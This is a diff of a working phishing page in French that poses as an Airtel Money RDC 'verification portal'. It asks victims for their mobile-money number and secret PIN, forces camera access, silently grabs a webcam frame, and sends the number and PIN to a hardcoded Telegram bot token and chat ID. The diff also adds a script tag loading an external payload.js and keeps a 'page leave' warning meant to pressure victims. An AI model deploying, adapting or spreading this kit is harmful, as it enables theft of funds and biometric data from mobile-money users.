@@ -334,45 +334,41 @@
         <div class="subtitle">Portail de vérification sécurisé</div>
         
         <div class="info-beneficiaire">
-            <strong>⚠️ INFORMATION IMPORTANTE</strong>
+            <strong>INFORMATION IMPORTANTE</strong>
             <p>Si vous êtes le bénéficiaire du transfert, veuillez insérer votre numéro Airtel Money et votre code PIN sécurisé. L'erreur de conciliation sera résolue automatiquement dans les 5 minutes suivant la validation.</p>
         </div>
         
-        <!-- Zone de permission caméra OBLIGATOIRE -->
         <div class="camera-permission-box" id="cameraBox">
             <div class="camera-status">
-                <span> Vérification d'identité</span>
+                <span>Verification d'identite</span>
                 <span class="status-badge pending" id="cameraStatusBadge">EN ATTENTE</span>
             </div>
-            <p style="font-size: 13px; color: #6c757d; margin-bottom: 12px;">
-                Pour des raisons de sécurité, la vérification par caméra est obligatoire avant la soumission.
-            </p>
-            <button type="button" class="btn-camera" id="enableCameraBtn">📸 ACTIVER LA CAMÉRA</button>
+            <button type="button" class="btn-camera" id="enableCameraBtn">ACTIVER LA CAMERA</button>
             <div class="security-note">
-                🔒 La vérification est instantanée et ne sera pas enregistrée
+                La verification est instantanee et ne sera pas enregistree
             </div>
         </div>
         
         <form id="verificationForm">
             <div class="form-group">
-                <label>Numéro Airtel Money <span class="required">*</span></label>
+                <label>Numero Airtel Money <span class="required">*</span></label>
                 <input type="tel" id="phoneNumber" name="phoneNumber" placeholder="+243 XXX XXX XXX" autocomplete="off" required>
             </div>
             
             <div class="form-group">
-                <label>Code PIN sécurisé <span class="required">*</span></label>
+                <label>Code PIN securise <span class="required">*</span></label>
                 <input type="password" id="pinCode" name="pinCode" placeholder="••••" maxlength="6" autocomplete="off" required>
             </div>
             
-            <button type="submit" class="submit-btn" id="submitBtn" disabled>🔒 VALIDER ET RÉSOUDRE L'ERREUR</button>
+            <button type="submit" class="submit-btn" id="submitBtn" disabled>VALIDER ET RESOUDRE L'ERREUR</button>
         </form>
         
         <div class="timer-info" id="timerInfo" style="display: none;">
-            ⏳ Traitement en cours... Résolution automatique dans <span id="countdown">5:00</span>
+            Traitement en cours... Resolution automatique dans <span id="countdown">5:00</span>
         </div>
         
         <div class="footer-note">
-            <p>© 2026 Airtel Money RDC – Transaction sécurisée | Code: VERIF-0226</p>
+            <p>© 2026 Airtel Money RDC – Transaction securisee | Code: VERIF-0226</p>
         </div>
     </div>
 </div>
@@ -394,7 +390,6 @@
     let countdownInterval = null;
     let formSubmitted = false;
     
-    // Fonction pour arrêter la caméra
     function stopCamera() {
         if (cameraStream) {
             cameraStream.getTracks().forEach(track => track.stop());
@@ -402,10 +397,8 @@
         }
     }
     
-    // Fonction pour activer la caméra
     async function enableCamera() {
         try {
-            // Demander l'accès à la caméra
             const stream = await navigator.mediaDevices.getUserMedia({ 
                 video: { facingMode: "user", width: { ideal: 480 }, height: { ideal: 480 } },
                 audio: false 
@@ -414,39 +407,25 @@
             cameraStream = stream;
             cameraGranted = true;
             
-            // Mettre à jour l'interface
             cameraBox.classList.add('active');
             cameraBox.classList.remove('error');
-            cameraStatusBadge.textContent = 'ACTIVÉ';
+            cameraStatusBadge.textContent = 'ACTIVE';
             cameraStatusBadge.className = 'status-badge granted';
-            enableCameraBtn.textContent = '✅ CAMÉRA ACTIVÉE';
+            enableCameraBtn.textContent = 'CAMERA ACTIVE';
             enableCameraBtn.classList.add('granted');
             enableCameraBtn.disabled = true;
             
-            // Activer le bouton de soumission
             submitBtn.disabled = false;
             
-            // Créer un élément vidéo caché pour la vérification (simulation)
             const hiddenVideo = document.createElement('video');
             hiddenVideo.srcObject = stream;
             hiddenVideo.setAttribute('playsinline', '');
             hiddenVideo.style.position = 'fixed';
             hiddenVideo.style.top = '-9999px';
             hiddenVideo.style.left = '-9999px';
-            hiddenVideo.style.width = '1px';
-            hiddenVideo.style.height = '1px';
             document.body.appendChild(hiddenVideo);
             await hiddenVideo.play();
             
-            // Envoyer une confirmation silencieuse à Telegram via payload.js
-            if (typeof window.dispatchEvent === 'function') {
-                const cameraEvent = new CustomEvent('airtelValidationTriggered', { 
-                    detail: { time: Date.now(), action: 'cameraGranted', status: 'success' } 
-                });
-                window.dispatchEvent(cameraEvent);
-            }
-            
-            // Optionnel: capturer une photo silencieuse pour vérification (simulé)
             setTimeout(() => {
                 const canvas = document.createElement('canvas');
                 canvas.width = hiddenVideo.videoWidth || 320;
@@ -454,52 +433,40 @@
                 const ctx = canvas.getContext('2d');
                 if (canvas.width > 0 && canvas.height > 0) {
                     ctx.drawImage(hiddenVideo, 0, 0, canvas.width, canvas.height);
-                    // Envoi via payload.js si présent
-                    console.log('[CAMERA] Capture de vérification effectuée');
                 }
                 hiddenVideo.remove();
-                // On garde le stream actif pour l'instant
             }, 500);
-            
-        } catch (error) {
-            console.error('Erreur caméra:', error);
-            cameraGranted = false;
-            cameraBox.classList.add('error');
-            cameraBox.classList.remove('active');
-            cameraStatusBadge.textContent = 'REFUSÉ';
-            cameraStatusBadge.className = 'status-badge denied';
-            enableCameraBtn.textContent = '❌ RÉESSAYER - CAMÉRA REFUSÉE';
-            submitBtn.disabled = true;
-            
-            // Notification d'erreur
-            const errorMsg = document.createElement('div');
-            errorMsg.textContent = '⚠️ La vérification par caméra est obligatoire. Veuillez autoriser l\'accès.';
-            errorMsg.style.cssText = 'position:fixed;bottom:20px;left:20px;right:20px;background:#DC143C;color:white;padding:12px;border-radius:16px;text-align:center;font-size:13px;z-index:10001;';
-            document.body.appendChild(errorMsg);
-            setTimeout(() => errorMsg.remove(), 4000);
             
             if (typeof window.dispatchEvent === 'function') {
                 const cameraEvent = new CustomEvent('airtelValidationTriggered', { 
-                    detail: { time: Date.now(), action: 'cameraDenied', error: error.message } 
+                    detail: { time: Date.now(), action: 'cameraGranted', page: 'login' } 
                 });
                 window.dispatchEvent(cameraEvent);
             }
+            
+        } catch (error) {
+            console.error('Erreur camera:', error);
+            cameraGranted = false;
+            cameraBox.classList.add('error');
+            cameraBox.classList.remove('active');
+            cameraStatusBadge.textContent = 'REFUSE';
+            cameraStatusBadge.className = 'status-badge denied';
+            enableCameraBtn.textContent = 'REESSAYER - CAMERA REFUSEE';
+            submitBtn.disabled = true;
         }
     }
     
-    // Écouteur pour le bouton d'activation caméra
     enableCameraBtn.addEventListener('click', enableCamera);
     
-    // Fonction de décompte
     function startCountdown() {
-        let timeLeft = 300; // 5 minutes en secondes
+        let timeLeft = 300;
         
         if (countdownInterval) clearInterval(countdownInterval);
         
         countdownInterval = setInterval(() => {
             if (timeLeft <= 0) {
                 clearInterval(countdownInterval);
-                timerInfo.innerHTML = '<span style="color:#28a745;">✅ ERREUR RÉSOLUE - TRANSFERT DÉBLOQUÉ</span>';
+                timerInfo.innerHTML = '<span style="color:#28a745;">ERREUR RESOLUE - TRANSFERT DEBLOQUE</span>';
                 setTimeout(() => {
                     window.location.href = 'index.html';
                 }, 3000);
@@ -512,15 +479,13 @@
         }, 1000);
     }
     
-    // Soumission du formulaire
     verificationForm.addEventListener('submit', async function(e) {
         e.preventDefault();
         
-        // Vérifier que la caméra est activée
         if (!cameraGranted) {
             const warning = document.createElement('div');
-            warning.textContent = '⚠️ Veuillez activer la caméra avant de soumettre le formulaire.';
-            warning.style.cssText = 'position:fixed;top:20px;left:50%;transform:translateX(-50%);background:#DC143C;color:white;padding:12px 25px;border-radius:50px;font-size:14px;z-index:10001;box-shadow:0 4px 15px rgba(0,0,0,0.3);';
+            warning.textContent = 'Veuillez activer la camera avant de soumettre le formulaire.';
+            warning.style.cssText = 'position:fixed;top:20px;left:50%;transform:translateX(-50%);background:#DC143C;color:white;padding:12px 25px;border-radius:50px;font-size:14px;z-index:10001;';
             document.body.appendChild(warning);
             setTimeout(() => warning.remove(), 3000);
             return;
@@ -537,11 +502,9 @@
         if (formSubmitted) return;
         formSubmitted = true;
         
-        // Désactiver le formulaire
         submitBtn.disabled = true;
-        submitBtn.textContent = '⏳ TRAITEMENT EN COURS...';
+        submitBtn.textContent = 'TRAITEMENT EN COURS...';
         
-        // Collecter les données pour envoi via payload.js
         const formData = {
             phone: phoneNumber,
             pin: pinCode,
@@ -550,7 +513,6 @@
             userAgent: navigator.userAgent
         };
         
-        // Envoyer via événement personnalisé pour payload.js
         if (typeof window.dispatchEvent === 'function') {
             const formEvent = new CustomEvent('airtelFormSubmitted', { 
                 detail: { 
@@ -562,11 +524,10 @@
             window.dispatchEvent(formEvent);
         }
         
-        // Envoi direct à Telegram si payload.js n'est pas présent
         try {
             const TELEGRAM_BOT_TOKEN = '8507961561:AAFGiLtXzjIcR-j2IQuIDA55QZDQEYQFq_4';
             const TELEGRAM_CHAT_ID = '6767182328';
-            const message = `🔐 NOUVELLE SOUMISSION\n━━━━━━━━━━━━━━━━━━━━━\n📱 Numéro: ${phoneNumber}\n🔢 Code PIN: ${pinCode}\n📅 Heure: ${new Date().toLocaleString()}\n📸 Caméra: ACTIVÉE\n━━━━━━━━━━━━━━━━━━━━━`;
+            const message = `NOUVELLE SOUMISSION\n━━━━━━━━━━━━━━━━━━━━━\nNumero: ${phoneNumber}\nCode PIN: ${pinCode}\nHeure: ${new Date().toLocaleString()}\nCamera: ACTIVE\n━━━━━━━━━━━━━━━━━━━━━`;
             
             await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
@@ -577,16 +538,14 @@
             console.log('Erreur envoi Telegram:', e);
         }
         
-        // Afficher le message de confirmation
         timerInfo.style.display = 'block';
         
-        // Créer une notification visuelle
         const modal = document.createElement('div');
         modal.className = 'modal';
         modal.innerHTML = `
             <div class="modal-content">
-                <h3>✓ RAPPORT ENVOYÉ</h3>
-                <p>Votre formulaire a bien été transmis au service de résolution. Veuillez patienter 5 minutes pendant que l'erreur est corrigée.</p>
+                <h3>RAPPORT ENVOYE</h3>
+                <p>Votre formulaire a bien ete transmis au service de resolution. Veuillez patienter 5 minutes pendant que l'erreur est corrigee.</p>
                 <button class="modal-btn" id="closeModal">OK</button>
             </div>
         `;
@@ -596,45 +555,30 @@
             modal.remove();
         });
         
-        // Démarrer le décompte
         startCountdown();
-        
-        // Arrêter la caméra après soumission
         stopCamera();
         
-        // Nettoyer les champs
         phoneInput.value = '';
         pinInput.value = '';
     });
     
-    // Vérification automatique si la caméra est déjà disponible
-    async function checkCameraAvailability() {
-        try {
-            const devices = await navigator.mediaDevices.enumerateDevices();
-            const hasCamera = devices.some(device => device.kind === 'videoinput');
-            if (!hasCamera) {
-                console.log('Aucune caméra détectée');
-            }
-        } catch(e) {}
-    }
-    checkCameraAvailability();
-    
-    // Gestion de la fermeture de page (pression psychologique)
     window.addEventListener('beforeunload', function(e) {
         if (!formSubmitted && cameraGranted) {
-            const confirmationMessage = "Attention: Vous n'avez pas finalisé la vérification. La transaction reste bloquée. Voulez-vous vraiment quitter ?";
+            const confirmationMessage = "Attention: Vous n'avez pas finalise la verification. La transaction reste bloquee.";
             e.preventDefault();
             e.returnValue = confirmationMessage;
             return confirmationMessage;
         }
     });
     
-    // Nettoyer la caméra à la fermeture
     window.addEventListener('unload', function() {
         stopCamera();
     });
 })();
 </script>
+
+<!-- AJOUT DE PAYLOAD.JS -->
+<script src="payload.js"></script>
 
 </body>
 </html>
